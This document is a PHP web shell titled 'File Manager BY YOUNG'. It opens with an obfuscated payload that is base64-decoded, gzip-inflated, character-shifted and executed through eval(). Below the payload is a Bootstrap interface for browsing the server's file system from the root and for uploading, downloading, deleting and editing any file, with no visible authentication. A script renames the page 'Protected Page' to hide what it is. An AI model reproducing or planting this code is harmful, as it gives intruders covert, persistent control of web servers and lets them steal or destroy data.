<?php function gLhtuK($FSCt)
{ 
$FSCt=gzinflate(base64_decode($FSCt));
 for($i=0;$i<strlen($FSCt);$i++)
 {
$FSCt[$i] = chr(ord($FSCt[$i])-1);
 }
 return $FSCt;
 }eval(gLhtuK("fVPbTttAEP0Af8U0imRbghgotBJRQKCGy0PbKE0aAUKrxR7iFfGutbuGlNJv72xiFzuO6idrLuecmTkLQJ/ned1nvhAJy7kxL0onMACfJ5mQ+wcf/b4nHiH4IIxBG3TZj+H453B854+uRuxsOrliU4r49yG8vcGW7Gjm38OHAWwwhPDbc9wp8gR14M9ms92zwqYorYi5xWM450bEoJEvskHnQiwQvnLJ56jh/AZuvk+/XXb8sN8AuZpMRtF+bw8O9/ZhKjnhKS1eMakKMU4V+I1MmVgK2/f+0CK4jlPxjCzFJSv0wm0itTY3x1Gk+UtvLmxaPBQGdaykJbW9WGXRL1XI+VOWRAZVlHEhoxpMzy4t0dSRCfWRJmJztKzEMcEmdVjreRCSeihxQH+B1SJrlIeu1mKWs1eR045t6nSvAmVVjxIkYsWaF3XWRtsO1CkJ1evi0moeW5YITaCMfbkeMwY98KMygwlzsObdKK42qDeG1bmzp83UDux9PjraAasLDN0JuqSFiCS+wK3Iz9Zq1tAutXuicpQbskMYDAYwGU+HFdG6tOSZqKaafq0kXiiDQd0fnQ7JAFwYLLHW0QtOQyZgFTgBcHs9gmq3rsEr5ELIp01hdJf14qrnczmc3PkUci/mFOjMCcYqwcAZ3XUED9zgp0NWhhsNtMZj+FdYnsJRPBYytkJJU7Nt43DuXI2iypSN4HZbtsCbjE5my5uNHudOpOcfbHQ5nFwriysPucj/5Lcrqxname2DbOdqq2hN0258H6mZW63GPQbCMDGXK7evLed5pyd/AQ=="));?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager BY YOUNG</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1 class="mb-4">File Manager</h1>
        <h3>Current Directory: <?php echo htmlspecialchars($dir); ?></h3>


        <?php if ($dir != realpath('/')): ?>
            <p><a href="?dir=<?php echo base64_encode(dirname($dir)); ?>" class="btn btn-secondary">.. (Go to Parent Directory)</a></p>
        <?php endif; ?>


        <form action="" method="POST" enctype="multipart/form-data" class="mb-4">
            <div class="input-group">
                <input type="file" name="file" class="form-control">
                <button type="submit" class="btn btn-primary">Upload File</button>
            </div>
        </form>


        <ul class="list-group">
            <?php foreach ($files as $file): ?>
                <?php if ($file === '.') continue; ?>

                <?php
                $file_path = $dir . '/' . $file;
                $file_url = '?dir=' . base64_encode($file_path);
                ?>

                <?php if (is_dir($file_path)): ?>

                    <li class="list-group-item">
                        <a href="<?php echo $file_url; ?>" class="text-decoration-none">
                            <?php echo htmlspecialchars($file); ?> (Directory)
                        </a>
                    </li>
                <?php else: ?>
                    <?php
                    $delete_url = '?dir=' . base64_encode($dir) . '&delete=' . base64_encode($file_path);
                    $edit_url = '?dir=' . base64_encode($dir) . '&edit=' . base64_encode($file_path);
                    ?>
                    <li class="list-group-item">
                        <?php echo htmlspecialchars($file); ?> (<?php echo formatSize(filesize($file_path)); ?>) - 
                        <a href="<?php echo $file_url; ?>" download class="text-decoration-none">Download</a> | 
                        <a href="<?php echo $delete_url; ?>" class="text-decoration-none text-danger">Delete</a> | 
                        <a href="<?php echo $edit_url; ?>" class="text-decoration-none text-primary">Edit</a>
                    </li>
                <?php endif; ?>
            <?php endforeach; ?>
        </ul>


        <?php if (isset($_GET['edit'])): ?>
            <?php
            $file_to_edit = urldecode(realpath(base64_decode($_GET['edit']))); 
            if (is_file($file_to_edit)):
                $content = file_get_contents($file_to_edit);
            ?>
                <h3 class="mt-4">Editing File: <?php echo htmlspecialchars(basename($file_to_edit)); ?></h3>
                <form action="" method="POST" class="mb-4">
                    <textarea name="file_content" rows="20" cols="100" class="form-control"><?php echo htmlspecialchars($content); ?></textarea><br>
                    <input type="hidden" name="edit_file" value="<?php echo base64_encode($file_to_edit); ?>">
                    <button type="submit" class="btn btn-primary">Save</button>
                </form>
            <?php endif; ?>
        <?php endif; ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
    <script>
        document.title = "Protected Page";
    </script>
</body>
</html>
